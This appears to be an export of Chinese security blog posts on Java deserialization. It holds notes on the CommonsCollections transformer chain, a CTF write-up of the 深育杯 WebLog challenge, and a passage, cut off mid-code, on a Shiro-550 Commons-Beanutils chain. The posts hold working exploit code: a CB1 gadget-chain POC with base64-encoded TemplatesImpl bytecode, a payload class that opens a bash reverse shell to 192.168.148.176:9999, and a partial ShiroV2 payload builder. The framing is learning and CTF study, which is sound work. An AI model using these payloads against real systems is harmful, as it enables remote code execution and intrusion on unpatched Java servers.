class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// ChainedTransformer 的 transformer 函数</span><br><span class="hljs-function"><span class="hljs-keyword">public</span> Object <span class="hljs-title">transform</span><span class="hljs-params">(Object object)</span> </span>&#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-keyword">this</span>.iTransformers.length; ++i) &#123;<br>        object = <span class="hljs-keyword">this</span>.iTransformers[i].transform(object);<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> object;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里测试随便传入一个 111 （它对于 ConstantTransformer类无影响），触发函数执行</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211125143702364.png" alt="image-20211125143702364"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211125143812109.png" alt="image-20211125143812109"></p><p>在触发执行 transformer 后，将返回 Runtime 类对象，之后赋值给 Object，然后再循环一次</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211125143904946.png" alt="image-20211125143904946"></p><p>这时的循环结果就是</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">InvokerTransformer invokerTransformer = <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> Class[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;gnome-calculator&quot;</span>&#125;);<br>invokerTransformer.transformer(Runtime对象);<br></code></pre></td></tr></table></figure><p><img src="D:\markdown\image-20211125143958267.png" alt="image-20211125143958267"></p><p>最后就会执行到 InvokerTransformer 的 transformer 函数，造成命令执行</p><p>这样虽然可以执行命令，但是 RunTime 类是没有反序列化接口的，所以它不能直接利用到反序列化的链子中。</p><h3 id="修改尝试绕过-Runtime-类序列化"><a href="#修改尝试绕过-Runtime-类序列化" class="headerlink" title="修改尝试绕过 Runtime 类序列化"></a>修改尝试绕过 Runtime 类序列化</h3><p>尝试利用其他办法调用到 RunTime 类，但是失败了，提示的是class类中不存在 getRuntime() 方法</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211125150536724.png" alt="image-20211125150536724"></p><p>发生变化的就是再 InvokerTransformer 类中</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211125150753678.png" alt="image-20211125150753678"></p><p>经过测试发现，getClass() 函数根据传入的参数不同返回的数据也不同</p><ol><li>如果传入的是对象，那么返回的就是当前对象的类</li><li>如果传入的是类，那么返回的就是 Class</li></ol><p>我的理解就是对于对象，getClass() 返回对象的类是肯定的，对于类返回的是就是类class</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211125150147911.png" alt="image-20211125150147911"></p><p>所以对于 java.lang.class 肯定是找不到 getRuntime 方法的</p><h3 id="最后的方法"><a href="#最后的方法" class="headerlink" title="最后的方法"></a>最后的方法</h3><p>最后就是利用反射的方法获取到 Runtime 类对象</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java">Transformer[] transformers = <span class="hljs-keyword">new</span> Transformer[]&#123;<br>                <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>,<span class="hljs-keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> Class[<span class="hljs-number">0</span>]&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>,<span class="hljs-keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-keyword">null</span>,<span class="hljs-keyword">new</span> Object[<span class="hljs-number">0</span>]&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> Class[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;gnome-calculator&quot;</span>&#125;)<br>        &#125;;<br>        ChainedTransformer chainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(transformers);<br>        chainedTransformer.transform(<span class="hljs-number">111</span>);<br></code></pre></td></tr></table></figure><p>执行到第一个InvokerTransformer时</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211125152448333.png" alt="image-20211125152448333"></p><p>再往后执行时发现 Object就变成 getRuntime 函数了，第二次执行 InvokerTransformer</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211125152559289.png" alt="image-20211125152559289"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211125153024011.png" alt="image-20211125153024011"></p><p>第三次执行 InvokerTransformer 时，这里的传入参数的 Object 就是一个 Runtime类对象</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211125153048287.png" alt="image-20211125153048287"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211125153448936.png" alt="image-20211125153448936"></p><p>这样就通过反射的方法调用了Runtime类进行了命令执行的操作，真的十分巧妙</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211125151319930.png" alt="image-20211125151319930"></p><p>之后的就是如何对于各种CC链的构造了，之前做过一些笔记，这就不多写了。这里主要是为了查漏补缺。</p><p>参考文章</p><p><a href="https://xz.aliyun.com/t/7031">https://xz.aliyun.com/t/7031</a></p><p><a href="http://wjlshare.com/archives/1498">http://wjlshare.com/archives/1498</a></p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>代码审计</tag>
      
      <tag>Web</tag>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>深育杯Weblog复现</title>
    <link href="/2021/11/18/%E6%B7%B1%E8%82%B2%E6%9D%AFWeblog%E5%A4%8D%E7%8E%B0/"/>
    <url>/2021/11/18/%E6%B7%B1%E8%82%B2%E6%9D%AFWeblog%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="深育杯-WebLog-复现"><a href="#深育杯-WebLog-复现" class="headerlink" title="深育杯 WebLog 复现"></a>深育杯 WebLog 复现</h1><p>题目的前面部分是利用文件下载功能下载到网站的jar包，由于环境没有了这里直接从jar开始做起。</p><p>查看路由发现了一个反序列化的入口</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211118004529001.png" alt="image-20211118004529001"></p><p>在jar包中的pom.xml中发现了<code>commoms-beanutils</code>依赖</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211118004420164.png" alt="image-20211118004420164"></p><blockquote><p>比赛的时候虽然想的是使用反序列化，但是当时只学到了CC链，所以没有想到使用CB链</p></blockquote><p>直接根据commons-beautils编写POC</p><p>POC</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.lcdm123;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> org.apache.commons.beanutils.BeanComparator;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.Comparator;<br><span class="hljs-keyword">import</span> java.util.PriorityQueue;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CB1</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException </span>&#123;<br>        <span class="hljs-keyword">byte</span>[] bytes = Base64.getDecoder().decode(<span class="hljs-string">&quot;yv66vgAAADQAMQcAIwoAAQAkCgAHACQKACUAJggAJwoAJQAoBwApAQAJdHJhbnNmb3JtAQByKExj&quot;</span> +<br>                <span class="hljs-string">&quot;b20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcv&quot;</span> +<br>                <span class="hljs-string">&quot;YXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAE&quot;</span> +<br>                <span class="hljs-string">&quot;Q29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAB9Mb3Jn&quot;</span> +<br>                <span class="hljs-string">&quot;L2xjZG0xMjMvVGVtcGxhdGVzSW1wbFRlc3Q7AQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBh&quot;</span> +<br>                <span class="hljs-string">&quot;Y2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcv&quot;</span> +<br>                <span class="hljs-string">&quot;YXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEACkV4&quot;</span> +<br>                <span class="hljs-string">&quot;Y2VwdGlvbnMHACoBAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9E&quot;</span> +<br>                <span class="hljs-string">&quot;T007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtM&quot;</span> +<br>                <span class="hljs-string">&quot;Y29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25I&quot;</span> +<br>                <span class="hljs-string">&quot;YW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9k&quot;</span> +<br>                <span class="hljs-string">&quot;dG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9p&quot;</span> +<br>                <span class="hljs-string">&quot;bnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEABG1haW4BABYoW0xqYXZh&quot;</span> +<br>                <span class="hljs-string">&quot;L2xhbmcvU3RyaW5nOylWAQAEYXJncwEAE1tMamF2YS9sYW5nL1N0cmluZzsHACsBAAY8aW5pdD4B&quot;</span> +<br>                <span class="hljs-string">&quot;AAMoKVYBAApTb3VyY2VGaWxlAQAWVGVtcGxhdGVzSW1wbFRlc3QuamF2YQEAHW9yZy9sY2RtMTIz&quot;</span> +<br>                <span class="hljs-string">&quot;L1RlbXBsYXRlc0ltcGxUZXN0DAAfACAHACwMAC0ALgEAEGdub21lLWNhbGN1bGF0b3IMAC8AMAEA&quot;</span> +<br>                <span class="hljs-string">&quot;QGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0&quot;</span> +<br>                <span class="hljs-string">&quot;VHJhbnNsZXQBADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNs&quot;</span> +<br>                <span class="hljs-string">&quot;ZXRFeGNlcHRpb24BABNqYXZhL2lvL0lPRXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApn&quot;</span> +<br>                <span class="hljs-string">&quot;ZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0&quot;</span> +<br>                <span class="hljs-string">&quot;cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwAhAAEABwAAAAAABAABAAgACQACAAoAAAA/AAAAAwAA&quot;</span> +<br>                <span class="hljs-string">&quot;AAGxAAAAAgALAAAABgABAAAADwAMAAAAIAADAAAAAQANAA4AAAAAAAEADwAQAAEAAAABABEAEgAC&quot;</span> +<br>                <span class="hljs-string">&quot;ABMAAAAEAAEAFAABAAgAFQACAAoAAABJAAAABAAAAAGxAAAAAgALAAAABgABAAAAFAAMAAAAKgAE&quot;</span> +<br>                <span class="hljs-string">&quot;AAAAAQANAA4AAAAAAAEADwAQAAEAAAABABYAFwACAAAAAQAYABkAAwATAAAABAABABQACQAaABsA&quot;</span> +<br>                <span class="hljs-string">&quot;AgAKAAAANwACAAEAAAAJuwABWbcAAlexAAAAAgALAAAACgACAAAAFwAIABgADAAAAAwAAQAAAAkA&quot;</span> +<br>                <span class="hljs-string">&quot;HAAdAAAAEwAAAAQAAQAeAAEAHwAgAAIACgAAAEAAAgABAAAADiq3AAO4AAQSBbYABlexAAAAAgAL&quot;</span> +<br>                <span class="hljs-string">&quot;AAAADgADAAAAGQAEABoADQAbAAwAAAAMAAEAAAAOAA0ADgAAABMAAAAEAAEAHgABACEAAAACACI=&quot;</span>);<br>        TemplatesImpl templates = <span class="hljs-keyword">new</span> TemplatesImpl();<br>        setFieldValue(templates,<span class="hljs-string">&quot;_bytecodes&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[][]&#123;bytes&#125;);<br>        setFieldValue(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;lcdm123&quot;</span>);<br><br>        Comparator comparator = <span class="hljs-keyword">new</span> BeanComparator(<span class="hljs-keyword">null</span>,String.CASE_INSENSITIVE_ORDER);<br>        PriorityQueue queue = <span class="hljs-keyword">new</span> PriorityQueue(<span class="hljs-number">3</span>,comparator);<br><br>        queue.add(<span class="hljs-string">&quot;1&quot;</span>);<br>        queue.add(<span class="hljs-string">&quot;2&quot;</span>);<br><br>        setFieldValue(comparator,<span class="hljs-string">&quot;property&quot;</span>,<span class="hljs-string">&quot;outputProperties&quot;</span>);<br>        setFieldValue(queue,<span class="hljs-string">&quot;queue&quot;</span>,<span class="hljs-keyword">new</span> Object[]&#123;templates,templates&#125;);<br><br>        ByteArrayOutputStream byteArrayOutputStream = <span class="hljs-keyword">new</span> ByteArrayOutputStream();<br>        ObjectOutputStream objectOutputStream = <span class="hljs-keyword">new</span> ObjectOutputStream(byteArrayOutputStream);<br>        objectOutputStream.writeObject(queue);<br>        objectOutputStream.close();<br>        <span class="hljs-comment">/*ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(byteArrayOutputStream.toByteArray());</span><br><span class="hljs-comment">        ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);</span><br><span class="hljs-comment">        objectInputStream.readObject();</span><br><span class="hljs-comment">        objectOutputStream.close();*/</span><br>        System.out.println(Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray()));<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setFieldValue</span><span class="hljs-params">(Object obj, String fieldName, Object value)</span> <span class="hljs-keyword">throws</span> NoSuchFieldException, IllegalAccessException </span>&#123;<br>        Class clazz = obj.getClass();<br>        Field field = clazz.getDeclaredField(fieldName);<br>        field.setAccessible(<span class="hljs-keyword">true</span>);<br>        field.set(obj, value);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211118011927753.png" alt="image-20211118011927753"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211118011843981.png" alt="image-20211118011843981"></p><p>经过测试这里直接执行了命令，尝试直接反弹shell</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.lcdm123;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TemplatesImplTest</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">AbstractTranslet</span> </span>&#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">transform</span><span class="hljs-params">(DOM document, SerializationHandler[] handlers)</span> <span class="hljs-keyword">throws</span> TransletException </span>&#123;<br><br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">transform</span><span class="hljs-params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="hljs-keyword">throws</span> TransletException </span>&#123;<br><br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException </span>&#123;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">TemplatesImplTest</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException </span>&#123;<br>        String[] cmd = &#123;<span class="hljs-string">&quot;/bin/bash&quot;</span>,<span class="hljs-string">&quot;-c&quot;</span>, <span class="hljs-string">&quot;bash -i &gt;&amp; /dev/tcp/192.168.148.176/9999 0&gt;&amp;1&quot;</span>&#125;;<br>        Runtime.getRuntime().exec(cmd);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211118013956274.png" alt="image-20211118013956274"></p><p>获取字节码的base64编码然后放入POC中，运行发送即可</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211118013854535.png" alt="image-20211118013854535"></p><p>成功</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211118013835543.png" alt="image-20211118013835543"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这个题目本身并不难，但是由于对Java反序列化的学习不到位，所以没有做出来，确实太菜了</p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>代码审计</tag>
      
      <tag>Web</tag>
      
      <tag>WriteUp</tag>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Shiro-550反序列化(二)</title>
    <link href="/2021/11/18/Shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E4%BA%8C/"/>
    <url>/2021/11/18/Shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E4%BA%8C/</url>
    
    <content type="html"><![CDATA[<h2 id="Shiro-550-反序列化链（二）"><a href="#Shiro-550-反序列化链（二）" class="headerlink" title="Shiro-550 反序列化链（二）"></a>Shiro-550 反序列化链（二）</h2><p>在实际情况下 Shiro 可能没有安装 commons-collections 这个时候就不能利用CC链了，但是这里可以利用Commons-Beanutils链吗?</p><p>在 P神的 shirodemo 中，把pom.xml中的commons-collections删除，重新使用Maven加载时，发现依赖库中依然存在 Commons-Beanutils，那么shiro就是依赖Commons-Beanutils的</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211117230122473.png" alt="image-20211117230122473"></p><p>那么这里可以直接使用 CB1链子吗？</p><p>但是这里显示报错了</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211117232538623.png" alt="image-20211117232538623"></p><p>根据报错判断和反序列化的<code>serialVersionUID</code>有关系，应该是两边的Commons-Beanutils版本不一样导致的。修改本地版本重新测试</p><p>修改之后报错改变了</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211117233152969.png" alt="image-20211117233152969"></p><blockquote><p>不能加载 org.apache.commons.collections.comparators.ComparableComparator 类</p></blockquote><p>在Commons-Beanutils中只依赖了一部分commons-collections 但是在shiro正常使用时不依赖于commons-collections，但反序列化利用的时候需要依赖于commons-collections。</p><p>所以这里就需要找到代替的类</p><h2 id="无依赖shiro反序列化链"><a href="#无依赖shiro反序列化链" class="headerlink" title="无依赖shiro反序列化链"></a>无依赖shiro反序列化链</h2><p>先寻找使用<code>org.apache.commons.collections.comparators.ComparableComparator</code>的地方</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211117234506871.png" alt="image-20211117234506871"></p><p>在<code>BeanComparator</code>的构造函数有两个地方使用了，但是只需要在构造函数中传入<code>compatator</code>参数就可以绕过了。但是我们需要重新找到一个类来替换<code>ComparableComparator</code>，并且需要满足的条件</p><ul><li>实现了<code>java.util.Comparator</code>接口</li><li>实现了反序列化接口</li><li>java shiro 或 commons-beanutils 自带的，并且兼容性强</li></ul><p>这里找到了一个完美的代替类<code>CaseInsensitiveComparator</code>，它是String类中的一个内部私有类</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211117235513616.png" alt="image-20211117235513616"></p><p>我们通过 <code>String.CASE_INSENSITIVE_ORDER</code> 即可拿到上下文中的 <code>CaseInsensitiveComparator</code> 对 象，用它来实例化 <code>BeanComparator</code></p><p>所以这里重新修改链子</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.lcdm123;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> org.apache.commons.beanutils.BeanComparator;<br><span class="hljs-keyword">import</span> org.apache.shiro.crypto.AesCipherService;<br><span class="hljs-keyword">import</span> org.apache.shiro.util.ByteSource;<br><br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.PriorityQueue;<br><span class="hljs-keyword">import</span> java.lang.String;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ShiroV2</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException </span>&#123;<br>        <span class="hljs-keyword">byte</span>[] bytes = Base64.getDecoder().decode(<span class="hljs-string">&quot;yv66vgAAADQAMQcAIwoAAQAkCgAHACQKACUAJggAJwoAJQAoBwApAQAJdHJhbnNmb3JtAQByKExj&quot;</span> +<br>                <span class="hljs-string">&quot;b20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcv&quot;</span> +<br>                <span class="hljs-string">&quot;YXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAE&quot;</span> +<br>                <span class="hljs-string">&quot;Q29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAB9Mb3Jn&quot;</span> +<br>                <span class="hljs-string">&quot;L2xjZG0xMjMvVGVtcGxhdGVzSW1wbFRlc3Q7AQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBh&quot;</span> +<br>                <span class="hljs-string">&quot;Y2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcv&quot;</span> +<br>                <span class="hljs-string">&quot;YXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEACkV4&quot;</span> +<br>                <span class="hljs-string">&quot;Y2VwdGlvbnMHACoBAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9E&quot;</span> +<br>                <span class="hljs-string">&quot;T007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtM&quot;</span> +<br>                <span class="hljs-string">&quot;Y29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25I&quot;</span> +<br>                <span class="hljs-string">&quot;YW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9k&quot;</span> +<br>                <span class="hljs-string">&quot;dG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9p&quot;</span> +<br>                <span 